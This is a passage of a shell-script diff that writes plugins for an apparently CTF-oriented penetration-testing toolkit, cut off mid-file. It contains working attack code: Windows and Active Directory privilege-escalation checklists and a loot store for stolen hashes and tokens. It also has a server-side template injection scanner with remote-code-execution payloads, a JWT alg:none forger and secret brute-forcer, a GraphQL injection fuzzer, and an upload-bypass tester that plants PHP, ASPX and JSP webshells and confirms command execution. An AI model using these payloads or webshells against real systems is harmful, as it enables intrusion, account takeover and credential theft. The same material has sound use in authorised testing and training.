+    {"id": "defender",   "title": "Defender status",     "cmd": "sc query windefend",                               "category": "av"},
+    {"id": "seimpersonate","title": "SeImpersonatePrivilege","cmd": "whoami /priv | findstr /i impersonate",        "category": "tokens"},
+    {"id": "network",    "title": "Network info",        "cmd": "ipconfig /all && route print && netstat -ano",     "category": "network"},
+    {"id": "shares",     "title": "Network shares",      "cmd": "net share && net view /all",                       "category": "network"},
+    {"id": "pass_files", "title": "Password files",      "cmd": "dir /s /b *pass* *cred* *vnc* *config* C:\\ 2>nul | findstr /iv recycle", "category": "credentials"},
+]
+
+AD_CHECKLIST = [
+    {"id": "domain_info",   "title": "Domain info",           "cmd": "nltest /dclist: && net user /domain",          "category": "recon"},
+    {"id": "domain_admins", "title": "Domain Admins",         "cmd": "net group \"Domain Admins\" /domain",          "category": "recon"},
+    {"id": "kerberoast",    "title": "Kerberoastable SPNs",   "cmd": "setspn -T domain -Q */* | grep -v krbtgt",     "category": "kerberos"},
+    {"id": "asrep",         "title": "ASREPRoastable",        "cmd": "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth", "category": "kerberos"},
+    {"id": "acl_abuse",     "title": "ACL misconfigs",        "cmd": "Run BloodHound for ACL analysis",              "category": "acl"},
+    {"id": "gpo_abuse",     "title": "GPO permissions",       "cmd": "Get-GPO -All | Get-GPOReport -ReportType XML",  "category": "gpo"},
+    {"id": "delegation",    "title": "Unconstrained delegation","cmd": "Get-ADComputer -Filter {TrustedForDelegation -eq $true}", "category": "delegation"},
+    {"id": "laps",          "title": "LAPS passwords",        "cmd": "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd", "category": "credentials"},
+    {"id": "dcsync",        "title": "DCSync rights",         "cmd": "Run BloodHound → Shortest Paths to Domain Admins", "category": "dcops"},
+]
+
+PORT_TO_TECHNIQUE = {
+    "22":    ["ssh_keys", "history", "env", "passwd_hash"],
+    "80":    ["db_creds", "backups", "writable"],
+    "443":   ["db_creds", "backups", "writable"],
+    "3306":  ["db_creds", "passwd_hash"],
+    "5432":  ["db_creds", "passwd_hash"],
+    "6379":  ["env", "db_creds"],
+    "8080":  ["db_creds", "backups"],
+    "445":   ["svc_perms", "unquoted", "shares"],
+    "389":   ["domain_info", "kerberoast", "asrep"],
+    "88":    ["kerberoast", "asrep", "delegation"],
+    "3389":  ["cmdkey", "ps_history", "pass_files"],
+    "5985":  ["cmdkey", "ps_history"],
+    "1433":  ["db_creds", "svc_perms"],
+}
+
+
+def get_checklist(os_type: str = "linux", open_ports: list = None) -> dict:
+    open_ports = open_ports or []
+    base = {"linux": LINUX_CHECKLIST, "windows": WINDOWS_CHECKLIST, "ad": AD_CHECKLIST}.get(
+        os_type.lower(), LINUX_CHECKLIST
+    )
+
+    # Auto-prioritise items relevant to open ports
+    priority_ids = set()
+    for port in open_ports:
+        priority_ids.update(PORT_TO_TECHNIQUE.get(str(port), []))
+
+    items = []
+    for item in base:
+        entry = {**item, "priority": item["id"] in priority_ids, "completed": False}
+        items.append(entry)
+
+    # Sort: priority items first
+    items.sort(key=lambda x: (not x["priority"], x["id"]))
+
+    return {
+        "os_type": os_type,
+        "total": len(items),
+        "priority_count": len(priority_ids),
+        "items": items,
+        "categories": list({i["category"] for i in items}),
+    }
+PY
+
+
+# ── Loot Organizer ────────────────────────────────────────────────────────────
+cat > "$BASE/plugins/loot_organizer.py" <<'PY'
+"""Structured loot store — flags, hashes, passwords, keys, secrets per scan/box."""
+import json
+import logging
+import sqlite3
+from contextlib import closing
+from typing import Optional
+
+from core.db_engine import get_db
+
+logger = logging.getLogger(__name__)
+
+LOOT_SCHEMA = """
+CREATE TABLE IF NOT EXISTS loot (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    scan_id TEXT,
+    box_name TEXT,
+    loot_type TEXT NOT NULL,
+    value TEXT NOT NULL,
+    description TEXT DEFAULT '',
+    source TEXT DEFAULT '',
+    confirmed INTEGER DEFAULT 0,
+    created_at TEXT DEFAULT (datetime('now'))
+);
+CREATE INDEX IF NOT EXISTS idx_loot_scan ON loot(scan_id);
+CREATE INDEX IF NOT EXISTS idx_loot_box  ON loot(box_name);
+CREATE INDEX IF NOT EXISTS idx_loot_type ON loot(loot_type);
+"""
+
+LOOT_TYPES = ["flag_user", "flag_root", "password", "hash", "ssh_key",
+              "api_key", "token", "cookie", "secret", "database_cred", "other"]
+
+
+def _init():
+    with closing(get_db()) as db:
+        db.executescript(LOOT_SCHEMA)
+        db.commit()
+
+
+def add_loot(
+    loot_type: str,
+    value: str,
+    scan_id: str = "",
+    box_name: str = "",
+    description: str = "",
+    source: str = "",
+    confirmed: bool = False,
+) -> Optional[int]:
+    _init()
+    if loot_type not in LOOT_TYPES:
+        loot_type = "other"
+    try:
+        with closing(get_db()) as db:
+            cur = db.execute(
+                "INSERT OR IGNORE INTO loot (scan_id, box_name, loot_type, value, description, source, confirmed) "
+                "VALUES (?,?,?,?,?,?,?)",
+                (scan_id, box_name, loot_type, value, description, source, int(confirmed)),
+            )
+            db.commit()
+            return cur.lastrowid
+    except sqlite3.Error as exc:
+        logger.error(f"add_loot failed: {exc}")
+        return None
+
+
+def get_loot(
+    scan_id: Optional[str] = None,
+    box_name: Optional[str] = None,
+    loot_type: Optional[str] = None,
+    confirmed_only: bool = False,
+) -> list:
+    _init()
+    with closing(get_db()) as db:
+        q = "SELECT * FROM loot WHERE 1=1"
+        params = []
+        if scan_id:
+            q += " AND scan_id=?"; params.append(scan_id)
+        if box_name:
+            q += " AND box_name=?"; params.append(box_name)
+        if loot_type:
+            q += " AND loot_type=?"; params.append(loot_type)
+        if confirmed_only:
+            q += " AND confirmed=1"
+        q += " ORDER BY created_at DESC LIMIT 500"
+        rows = db.execute(q, params).fetchall()
+    return [dict(r) for r in rows]
+
+
+def confirm_loot(loot_id: int, confirmed: bool = True) -> None:
+    _init()
+    with closing(get_db()) as db:
+        db.execute("UPDATE loot SET confirmed=? WHERE id=?", (int(confirmed), loot_id))
+        db.commit()
+
+
+def delete_loot(loot_id: int) -> None:
+    _init()
+    with closing(get_db()) as db:
+        db.execute("DELETE FROM loot WHERE id=?", (loot_id,))
+        db.commit()
+
+
+def loot_summary(scan_id: Optional[str] = None) -> dict:
+    _init()
+    with closing(get_db()) as db:
+        base = "SELECT loot_type, COUNT(*) as cnt FROM loot"
+        if scan_id:
+            rows = db.execute(base + " WHERE scan_id=? GROUP BY loot_type", (scan_id,)).fetchall()
+        else:
+            rows = db.execute(base + " GROUP BY loot_type").fetchall()
+        flags = db.execute(
+            "SELECT loot_type, value, box_name FROM loot WHERE loot_type IN ('flag_user','flag_root')" +
+            (" AND scan_id=?" if scan_id else ""),
+            ([scan_id] if scan_id else [])
+        ).fetchall()
+    return {
+        "by_type": {r["loot_type"]: r["cnt"] for r in rows},
+        "flags": [dict(f) for f in flags],
+        "total": sum(r["cnt"] for r in rows),
+    }
+PY
+
+# ── SSTI Scanner ──────────────────────────────────────────────────────────────
+cat > "$BASE/plugins/ssti_scanner.py" <<'PY'
+"""
+Server-Side Template Injection scanner.
+Detects Jinja2, Twig, Smarty, Freemarker, ERB, Velocity.
+"""
+import logging
+import re
+import time
+from typing import Optional
+from urllib.parse import urlencode, urlparse, parse_qs
+
+import requests
+
+logger = logging.getLogger(__name__)
+requests.packages.urllib3.disable_warnings()
+
+SESSION = requests.Session()
+SESSION.headers.update({"User-Agent": "Mozilla/5.0"})
+
+# Detection payloads: (engine, payload, expected_pattern)
+DETECT_PAYLOADS = [
+    # Math-based detection (engine-agnostic)
+    ("jinja2/twig",   "{{7*7}}",              re.compile(r"\b49\b")),
+    ("jinja2",        "{{7*'7'}}",            re.compile(r"7777777")),
+    ("twig",          "{{7*'7'}}",            re.compile(r"\b49\b")),
+    ("smarty",        "{7*7}",                re.compile(r"\b49\b")),
+    ("smarty",        "{$smarty.version}",    re.compile(r"\d+\.\d+\.\d+")),
+    ("freemarker",    "${7*7}",               re.compile(r"\b49\b")),
+    ("freemarker",    "#{7*7}",               re.compile(r"\b49\b")),
+    ("erb",           "<%= 7*7 %>",           re.compile(r"\b49\b")),
+    ("velocity",      "#set($x=7*7)${x}",     re.compile(r"\b49\b")),
+    ("mako",          "${7*7}",               re.compile(r"\b49\b")),
+    ("pebble",        "{{7*7}}",              re.compile(r"\b49\b")),
+    # String operations
+    ("jinja2",        "{{\"test\"|upper}}",   re.compile(r"TEST")),
+    ("jinja2",        "{{config}}",           re.compile(r"Config|SECRET")),
+    # Error-based
+    ("any",           "{{",                   re.compile(r"TemplateSyntaxError|ParseError|SyntaxError|Jinja2", re.IGNORECASE)),
+    ("any",           "${",                   re.compile(r"FreeMarkerException|ParseException", re.IGNORECASE)),
+]
+
+EXPLOIT_PAYLOADS = {
+    "jinja2_rce": [
+        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+        "{{''.class.mro()[1].subclasses()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
+        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+    ],
+    "twig_rce": [
+        "{{['id']|filter('system')}}",
+        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+    ],
+    "smarty_rce": [
+        "{php}echo `id`;{/php}",
+        "{system('id')}",
+        "{php}system('id');{/php}",
+    ],
+    "freemarker_rce": [
+        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+    ],
+    "erb_rce": [
+        "<%= `id` %>",
+        "<%= system('id') %>",
+    ],
+}
+
+
+def _inject(url: str, param: str, payload: str) -> str:
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query, keep_blank_values=True)
+    params[param] = [payload]
+    return parsed._replace(query=urlencode({k: v[0] for k, v in params.items()})).geturl()
+
+
+def _get_params(url: str) -> list:
+    return list(parse_qs(urlparse(url).query).keys()) or ["q", "search", "name", "input", "template", "page"]
+
+
+def scan_ssti(url: str, timeout: int = 8) -> dict:
+    findings = []
+    params = _get_params(url)
+
+    for param in params:
+        for engine, payload, pattern in DETECT_PAYLOADS:
+            inject_url = _inject(url, param, payload)
+            try:
+                resp = SESSION.get(inject_url, timeout=timeout, verify=False, allow_redirects=True)
+                if pattern.search(resp.text):
+                    finding = {
+                        "type": "ssti",
+                        "engine": engine,
+                        "param": param,
+                        "payload": payload,
+                        "url": inject_url,
+                        "confirmed": True,
+                        "severity": "CRITICAL",
+                    }
+                    # Try RCE confirmation
+                    if engine.split("/")[0] in EXPLOIT_PAYLOADS:
+                        rce_payloads = EXPLOIT_PAYLOADS.get(f"{engine.split('/')[0]}_rce", [])
+                        for rce in rce_payloads[:2]:
+                            rce_url = _inject(url, param, rce)
+                            try:
+                                rce_resp = SESSION.get(rce_url, timeout=timeout, verify=False)
+                                if re.search(r"uid=\d+|root|www-data", rce_resp.text):
+                                    finding["rce_confirmed"] = True
+                                    finding["rce_payload"] = rce
+                                    finding["rce_output"] = re.search(r"(uid=\d+\([^)]+\)[^\n]*)", rce_resp.text)
+                                    if finding["rce_output"]:
+                                        finding["rce_output"] = finding["rce_output"].group(1)
+                                    break
+                            except Exception:
+                                pass
+                    findings.append(finding)
+                    break
+            except requests.RequestException as exc:
+                logger.debug(f"SSTI probe error: {exc}")
+
+    return {
+        "url": url,
+        "findings": findings,
+        "vulnerable": len(findings) > 0,
+        "finding_count": len(findings),
+        "engines_detected": list({f["engine"] for f in findings}),
+    }
+PY
+
+
+# ── JWT Inspector & Forger ────────────────────────────────────────────────────
+cat > "$BASE/plugins/jwt_inspector.py" <<'PY'
+"""
+JWT inspector, decoder, and forger.
+Detects: alg:none, weak secrets, RS256→HS256 confusion.
+"""
+import base64
+import hashlib
+import hmac
+import json
+import logging
+import re
+import time
+from typing import Optional
+
+logger = logging.getLogger(__name__)
+
+COMMON_SECRETS = [
+    "secret", "password", "123456", "admin", "key", "jwt_secret",
+    "your-256-bit-secret", "changeme", "secret_key", "supersecret",
+    "mysecret", "test", "flask-secret", "django-insecure", "laravel",
+    "1234567890", "qwerty", "abc123", "token", "auth_secret",
+    "HS256", "HS384", "HS512", "none", "null", "",
+]
+
+
+def _b64d(s: str) -> bytes:
+    s = s.replace("-", "+").replace("_", "/")
+    return base64.b64decode(s + "=" * (-len(s) % 4))
+
+
+def _b64e(b: bytes) -> str:
+    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
+
+
+def decode_jwt(token: str) -> dict:
+    parts = token.strip().split(".")
+    if len(parts) != 3:
+        return {"error": "Not a valid JWT (expected 3 parts)"}
+    try:
+        header  = json.loads(_b64d(parts[0]))
+        payload = json.loads(_b64d(parts[1]))
+        sig     = parts[2]
+        now     = int(time.time())
+        exp     = payload.get("exp")
+        iat     = payload.get("iat")
+        return {
+            "header":  header,
+            "payload": payload,
+            "signature": sig,
+            "algorithm": header.get("alg", "unknown"),
+            "expired": (exp is not None and exp < now),
+            "expires_in": (exp - now) if exp else None,
+            "issued_at": iat,
+            "raw_parts": parts,
+            "kid": header.get("kid"),
+            "typ": header.get("typ"),
+        }
+    except Exception as exc:
+        return {"error": f"Decode failed: {exc}"}
+
+
+def forge_none_alg(token: str) -> Optional[str]:
+    """Attempt alg:none attack."""
+    parts = token.strip().split(".")
+    if len(parts) != 3:
+        return None
+    try:
+        header = json.loads(_b64d(parts[0]))
+        header["alg"] = "none"
+        new_header = _b64e(json.dumps(header, separators=(",", ":")).encode())
+        return f"{new_header}.{parts[1]}."
+    except Exception:
+        return None
+
+
+def brute_secret(token: str, secrets: list = None) -> dict:
+    """Brute-force HMAC secret against common wordlist."""
+    parts = token.strip().split(".")
+    if len(parts) != 3:
+        return {"cracked": False, "error": "Invalid JWT"}
+    try:
+        header = json.loads(_b64d(parts[0]))
+        alg = header.get("alg", "HS256")
+        if not alg.startswith("HS"):
+            return {"cracked": False, "message": f"Cannot brute {alg} (not HMAC)"}
+    except Exception:
+        return {"cracked": False, "error": "Header decode failed"}
+
+    hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
+    hash_fn = hash_map.get(alg, hashlib.sha256)
+    signing_input = f"{parts[0]}.{parts[1]}".encode()
+    expected_sig = _b64d(parts[2])
+
+    for secret in (secrets or COMMON_SECRETS):
+        try:
+            sig = hmac.new(secret.encode(), signing_input, hash_fn).digest()
+            if hmac.compare_digest(sig, expected_sig):
+                return {"cracked": True, "secret": secret, "algorithm": alg}
+        except Exception:
+            continue
+
+    return {"cracked": False, "algorithm": alg, "tried": len(secrets or COMMON_SECRETS)}
+
+
+def forge_with_secret(token: str, secret: str, payload_overrides: dict = None) -> Optional[str]:
+    """Forge a new JWT with a known secret and optional payload changes."""
+    parts = token.strip().split(".")
+    if len(parts) != 3:
+        return None
+    try:
+        header  = json.loads(_b64d(parts[0]))
+        payload = json.loads(_b64d(parts[1]))
+        if payload_overrides:
+            payload.update(payload_overrides)
+        alg = header.get("alg", "HS256")
+        hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
+        hash_fn = hash_map.get(alg, hashlib.sha256)
+        new_header  = _b64e(json.dumps(header,  separators=(",", ":")).encode())
+        new_payload = _b64e(json.dumps(payload, separators=(",", ":")).encode())
+        signing_input = f"{new_header}.{new_payload}".encode()
+        sig = hmac.new(secret.encode(), signing_input, hash_fn).digest()
+        return f"{new_header}.{new_payload}.{_b64e(sig)}"
+    except Exception as exc:
+        logger.error(f"JWT forge failed: {exc}")
+        return None
+
+
+def analyze_jwt(token: str) -> dict:
+    decoded = decode_jwt(token)
+    if "error" in decoded:
+        return decoded
+    issues = []
+    alg = decoded.get("algorithm", "")
+    if alg.lower() == "none":
+        issues.append({"severity": "CRITICAL", "issue": "Algorithm is 'none' — no signature verification"})
+    if alg in ("HS256", "HS384", "HS512"):
+        brute = brute_secret(token)
+        if brute.get("cracked"):
+            issues.append({"severity": "CRITICAL", "issue": f"Weak secret cracked: '{brute['secret']}'"})
+            decoded["cracked_secret"] = brute["secret"]
+    if decoded.get("expired"):
+        issues.append({"severity": "INFO", "issue": "Token is expired"})
+    if not decoded.get("payload", {}).get("exp"):
+        issues.append({"severity": "MEDIUM", "issue": "No expiry (exp) claim — token never expires"})
+    none_forged = forge_none_alg(token)
+    if none_forged:
+        issues.append({"severity": "INFO", "issue": "alg:none forged token generated",
+                       "forged_token": none_forged})
+    decoded["issues"] = issues
+    decoded["risk"] = "CRITICAL" if any(i["severity"] == "CRITICAL" for i in issues) else \
+                      "MEDIUM"   if any(i["severity"] == "MEDIUM"   for i in issues) else "LOW"
+    return decoded
+PY
+
+# ── GraphQL Fuzzer ────────────────────────────────────────────────────────────
+cat > "$BASE/plugins/graphql_fuzzer.py" <<'PY'
+"""GraphQL introspection + basic fuzzer."""
+import logging
+from typing import Optional
+
+import requests
+
+logger = logging.getLogger(__name__)
+requests.packages.urllib3.disable_warnings()
+
+SESSION = requests.Session()
+SESSION.headers.update({"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"})
+
+INTROSPECTION_QUERY = """
+{
+  __schema {
+    queryType { name }
+    mutationType { name }
+    subscriptionType { name }
+    types {
+      name
+      kind
+      fields { name args { name type { name kind } } }
+      inputFields { name type { name kind } }
+    }
+  }
+}
+"""
+
+BATCH_INTROSPECTION = '[{"query":"{__schema{queryType{name}}}"},{"query":"{__schema{types{name}}}"}]'
+
+SQLI_PAYLOADS  = ["'", "\"", "1 OR 1=1", "' OR '1'='1"]
+SSTI_PAYLOADS  = ["{{7*7}}", "${7*7}", "<%= 7*7 %>"]
+NOSQLI_PAYLOADS= ['{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}']
+
+
+def _post(url: str, data, timeout: int = 10):
+    try:
+        r = SESSION.post(url, json=data, timeout=timeout, verify=False)
+        return r
+    except Exception:
+        return None
+
+
+def detect_graphql(url: str) -> dict:
+    """Try common GraphQL endpoints."""
+    paths = ["/graphql", "/api/graphql", "/v1/graphql", "/graph", "/gql",
+             "/graphiql", "/playground", "/api/v1/graphql", "/query"]
+    found = []
+    for path in paths:
+        full = url.rstrip("/") + path
+        r = _post(full, {"query": "{__typename}"})
+        if r and r.status_code in (200, 400) and ("data" in (r.text or "") or "errors" in (r.text or "")):
+            found.append({"url": full, "status": r.status_code})
+    return {"found": found, "detected": len(found) > 0}
+
+
+def introspect(url: str) -> dict:
+    r = _post(url, {"query": INTROSPECTION_QUERY})
+    if not r:
+        return {"error": "No response", "introspection_enabled": False}
+    if r.status_code != 200:
+        return {"error": f"HTTP {r.status_code}", "introspection_enabled": False}
+    try:
+        data = r.json()
+    except Exception:
+        return {"error": "Non-JSON response", "introspection_enabled": False}
+
+    if "errors" in data and not data.get("data"):
+        return {"introspection_enabled": False, "errors": data["errors"]}
+
+    schema = data.get("data", {}).get("__schema", {})
+    types  = schema.get("types", [])
+    user_types = [t for t in types if t["name"] and not t["name"].startswith("__")]
+    queries    = next((t for t in user_types if t["name"] == schema.get("queryType", {}).get("name")), {})
+    mutations  = next((t for t in user_types if t["name"] == (schema.get("mutationType") or {}).get("name")), {})
+    interesting = [t["name"] for t in user_types if any(
+        kw in t["name"].lower() for kw in ("user", "admin", "pass", "token", "auth", "secret", "key", "flag")
+    )]
+
+    return {
+        "introspection_enabled": True,
+        "query_fields":    [f["name"] for f in (queries.get("fields") or [])],
+        "mutation_fields": [f["name"] for f in (mutations.get("fields") or [])],
+        "type_count":      len(user_types),
+        "interesting_types": interesting,
+        "raw_schema":      schema,
+    }
+
+
+def fuzz_fields(url: str, field: str, arg: str) -> list:
+    """Fuzz a specific field+arg with injection payloads."""
+    findings = []
+    for payload in SQLI_PAYLOADS + SSTI_PAYLOADS + NOSQLI_PAYLOADS:
+        query = f'{{ {field}({arg}: "{payload}") }}'
+        r = _post(url, {"query": query})
+        if r and ("error" in r.text.lower() or "syntax" in r.text.lower() or "exception" in r.text.lower()):
+            findings.append({"field": field, "arg": arg, "payload": payload,
+                              "response_snippet": r.text[:300]})
+    return findings
+
+
+def scan_graphql(url: str) -> dict:
+    schema = introspect(url)
+    if not schema.get("introspection_enabled"):
+        return {"url": url, "introspection_enabled": False, "schema": schema}
+
+    fuzz_results = []
+    for field in (schema.get("query_fields", []) + schema.get("mutation_fields", []))[:10]:
+        results = fuzz_fields(url, field, "id")
+        fuzz_results.extend(results)
+
+    return {
+        "url": url,
+        "introspection_enabled": True,
+        "schema": schema,
+        "fuzz_findings": fuzz_results,
+        "vulnerable": len(fuzz_results) > 0,
+        "issues": (["Introspection enabled — schema exposed"] if schema["introspection_enabled"] else []) +
+                  ([f"{len(fuzz_results)} injection finding(s)"] if fuzz_results else []),
+    }
+PY
+
+
+# ── File Upload Bypass Tester ─────────────────────────────────────────────────
+cat > "$BASE/plugins/upload_bypass.py" <<'PY'
+"""
+File upload restriction bypass tester.
+Tests MIME type, extension, magic bytes, double extension, null byte tricks.
+"""
+import logging
+import re
+from typing import Optional
+
+import requests
+
+logger = logging.getLogger(__name__)
+requests.packages.urllib3.disable_warnings()
+
+SESSION = requests.Session()
+SESSION.headers.update({"User-Agent": "Mozilla/5.0"})
+
+WEBSHELL_PHP   = b"<?php system($_GET['cmd']); ?>"
+WEBSHELL_ASPX  = b"<%@ Page Language=\"C#\"%><%Response.Write(System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"cmd\"]).StandardOutput.ReadToEnd());%>"
+WEBSHELL_JSP   = b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
+POLYGLOT_PHP   = b"\xff\xd8\xff\xe0" + b"<?php system($_GET['cmd']); ?>"  # JPEG magic + PHP
+GIF_PHP        = b"GIF89a<?php system($_GET['cmd']); ?>"
+
+EXTENSIONS = {
+    "php":   [".php", ".php3", ".php4", ".php5", ".phtml", ".phar", ".php.jpg", ".php%00.jpg", ".PhP"],
+    "asp":   [".asp", ".aspx", ".asa", ".ashx", ".asmx", ".asp;.jpg"],
+    "jsp":   [".jsp", ".jspx", ".jsw", ".jsv", ".jspf"],
+    "server":[".shtml", ".shtm", ".stm", ".cgi", ".pl", ".py", ".rb"],
+}
+
+MIME_TYPES = {
+    "image/jpeg": b"\xff\xd8\xff\xe0",
+    "image/png":  b"\x89PNG\r\n\x1a\n",
+    "image/gif":  b"GIF89a",
+    "image/webp": b"RIFF",
+    "application/pdf": b"%PDF-1.",
+    "text/plain": b"",
+}
+
+BYPASS_STRATEGIES = [
+    {"name": "plain_upload",     "ext": ".php",       "mime": "application/octet-stream", "magic": b""},
+    {"name": "image_mime",       "ext": ".php",       "mime": "image/jpeg",               "magic": b""},
+    {"name": "gif_magic",        "ext": ".php",       "mime": "image/gif",                "magic": b"GIF89a"},
+    {"name": "jpeg_polyglot",    "ext": ".php",       "mime": "image/jpeg",               "magic": b"\xff\xd8\xff\xe0"},
+    {"name": "double_ext",       "ext": ".php.jpg",   "mime": "image/jpeg",               "magic": b"\xff\xd8\xff\xe0"},
+    {"name": "null_byte",        "ext": ".php\x00.jpg","mime": "image/jpeg",              "magic": b""},
+    {"name": "case_variation",   "ext": ".PhP",       "mime": "application/octet-stream", "magic": b""},
+    {"name": "phtml",            "ext": ".phtml",     "mime": "application/octet-stream", "magic": b""},
+    {"name": "phar",             "ext": ".phar",      "mime": "application/octet-stream", "magic": b""},
+    {"name": "svg_xss",          "ext": ".svg",       "mime": "image/svg+xml",
+     "magic": b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'},
+    {"name": "aspx_mime",        "ext": ".aspx",      "mime": "image/jpeg",               "magic": b"\xff\xd8\xff\xe0"},
+]
+
+
+def _build_payload(strategy: dict, content: bytes = WEBSHELL_PHP) -> tuple:
+    magic = strategy["magic"]
+    body  = magic + content if magic else content
+    fname = f"test{strategy['ext']}"
+    return fname, body, strategy["mime"]
+
+
+def test_upload(url: str, field_name: str = "file", verify_path: str = "",
+                timeout: int = 10) -> dict:
+    findings = []
+    for strategy in BYPASS_STRATEGIES:
+        fname, body, mime = _build_payload(strategy)
+        files = {field_name: (fname, body, mime)}
+        try:
+            r = SESSION.post(url, files=files, timeout=timeout, verify=False)
+            success_indicators = [
+                r.status_code in (200, 201),
+                "success" in r.text.lower(),
+                "uploaded" in r.text.lower(),
+                fname.split(".")[0] in r.text,
+            ]
+            url_in_resp = re.search(r"(https?://[^\s\"'<>]+\.(php|phtml|phar|aspx|jsp))", r.text)
+            if any(success_indicators) or url_in_resp:
+                finding = {
+                    "strategy": strategy["name"],
+                    "filename": fname,
+                    "mime": mime,
+                    "status": r.status_code,
+                    "upload_url": url_in_resp.group(1) if url_in_resp else None,
+                    "response_snippet": r.text[:300],
+                }
+                # Try to verify execution
+                if finding["upload_url"] and verify_path:
+                    try:
+                        exec_r = SESSION.get(finding["upload_url"] + "?cmd=id", timeout=5, verify=False)
+                        if re.search(r"uid=\d+", exec_r.text):
+                            finding["rce_confirmed"] = True
+                            finding["rce_output"] = re.search(r"(uid=\d+[^\n]*)", exec_r.text).group(1)
+                    except Exception:
+                        pass
+                findings.append(finding)
+        except requests.RequestException as exc:
+            logger.debug(f"Upload test error ({strategy['name']}): {exc}")
+
+    return {
+        "url": url,
+        "findings": findings,
+        "vulnerable": len(findings) > 0,
+        "finding_count": len(findings),
+        "rce_confirmed": any(f.get("rce_confirmed") for f in findings),
+    }
+PY
+
+# ── Attack Narrative Generator (Ollama) ──────────────────────────────────────
+cat > "$BASE/plugins/attack_narrative.py" <<'PY'
+"""
+Auto-generate HTB attack path narrative using Ollama.
+Feeds scan data, findings, credentials, and loot into the LLM.
+"""
+import json
+import logging
+import os
+from contextlib import closing
+from typing import Optional
+
+import requests
+
+logger = logging.getLogger(__name__)
+
+OLLAMA_BASE = os.getenv("OLLAMA_BASE_URL", "http://localhost:11434")
+OLLAMA_MODEL = os.getenv("OLLAMA_MODEL", "llama3")
+OLLAMA_TIMEOUT = int(os.getenv("OLLAMA_TIMEOUT", "120"))
+
+
+def _build_context(scan_id: str, box_name: str = "") -> str:
+    from core.db_engine import get_db
+    with closing(get_db()) as db:
+        row = db.execute("SELECT * FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not row:
+            return ""
+        notes = db.execute("SELECT content FROM notes WHERE scan_id=? ORDER BY created_at", (scan_id,)).fetchall()
+    data     = json.loads(row["data"] or "{}")
+    services = data.get("services", {})
+    cves     = data.get("cves", {})
+
+    # Build compact context
+    svc_lines = []
+    for port, info in services.items():
+        cve_count = len(cves.get(port, []))
+        crit = sum(1 for c in cves.get(port, []) if c.get("severity") == "CRITICAL")
+        svc_lines.append(f"  - Port {port}: {info.get('service')} {info.get('version','')} "
+                         f"({'%d CVEs, %d critical' % (cve_count, crit) if cve_count else 'no CVEs'})")
+
+    # Try to get loot
+    loot_lines = []
+    try:
+        from plugins.loot_organizer import get_loot
+        loot = get_loot(scan_id=scan_id)
+        for item in loot[:10]:
+            loot_lines.append(f"  - [{item['loot_type']}] {item['value'][:60]} ({item['description']})")
+    except Exception:
+        pass
+
+    note_lines = [f"  - {n['content'][:200]}" for n in notes[:5]]
+
+    return f"""
+Target: {row['target']} ({box_name or 'Unknown box'})
+OS Hint: {row.get('os_hint') or 'Unknown'}
+Status: {row['status']}
+
+Open Services:
+{chr(10).join(svc_lines) or '  None discovered'}
+
+Loot Found:
+{chr(10).join(loot_lines) or '  None'}
+
+Analyst Notes:
+{chr(10).join(note_lines) or '  None'}
+""".strip()
+
+
+def generate_narrative(
+    scan_id: str,
+    box_name: str = "",
+    difficulty: str = "Medium",
+    extra_context: str = "",
+) -> dict:
+    context = _build_context(scan_id, box_name)
+    if not context:
+        return {"error": "Scan not found"}
+
+    prompt = f"""You are an expert penetration tester writing an HTB writeup.
+Based on the following scan data, generate a clear, technical attack path narrative.
+Include: initial recon findings, exploitation steps, privilege escalation path, and key takeaways.
+Write in past tense as if the box has been completed. Be specific and technical.
+
+Scan Data:
+{context}
+
+Box: {box_name or 'Unknown'} | Difficulty: {difficulty}
+{('Additional context: ' + extra_context) if extra_context else ''}
+
+Write the attack narrative:"""
+
+    try:
+        r = requests.post(
+            f"{OLLAMA_BASE}/api/generate",
+            json={"model": OLLAMA_MODEL, "prompt": prompt, "stream": False},
+            timeout=OLLAMA_TIMEOUT,
+        )
+        r.raise_for_status()
+        data = r.json()
+        narrative = data.get("response", "").strip()
+        return {
+            "scan_id": scan_id,
+            "box_name": box_name,
+            "narrative": narrative,
+            "model": OLLAMA_MODEL,
+            "tokens": data.get("eval_count", 0),
+        }
+    except Exception as exc:
+        logger.error(f"Narrative generation failed: {exc}")
+        return {"error": str(exc), "scan_id": scan_id}
+PY
+
+
+# ── Methodology Suggester ─────────────────────────────────────────────────────
+cat > "$BASE/plugins/methodology_suggester.py" <<'PY'
+"""Suggests attack methodology based on open ports and OS hint."""
+
+PORT_PROFILES = {
+    "web_linux": {
+        "ports": {"80", "443", "8080", "8443", "8000", "8888"},
+        "methodology": "Web Application Pentest (Linux)",
+        "steps": [
+            "Directory/file brute-force (gobuster/feroxbuster)",
+            "Technology fingerprinting (whatweb, wappalyzer)",
+            "Source code review (JS files, comments, hidden fields)",
+            "SQLi on all input parameters",
+            "XSS on all reflected parameters",
+            "LFI/RFI via path traversal",
+            "SSTI in template parameters",
+            "File upload bypass",
+            "Default/weak credentials on admin panels",
+            "API endpoint enumeration (/api/v1/, /swagger/)",
+            "JWT inspection and forging",
+            "GraphQL introspection",
+            "SSRF via URL parameters",
+        ],
+    },
+    "smb_windows": {
+        "ports": {"139", "445"},
+        "methodology": "SMB Exploitation (Windows)",
+        "steps": [
+            "Null session enumeration (enum4linux-ng)",
+            "Share listing (smbclient -L)",
+            "Anonymous share access",
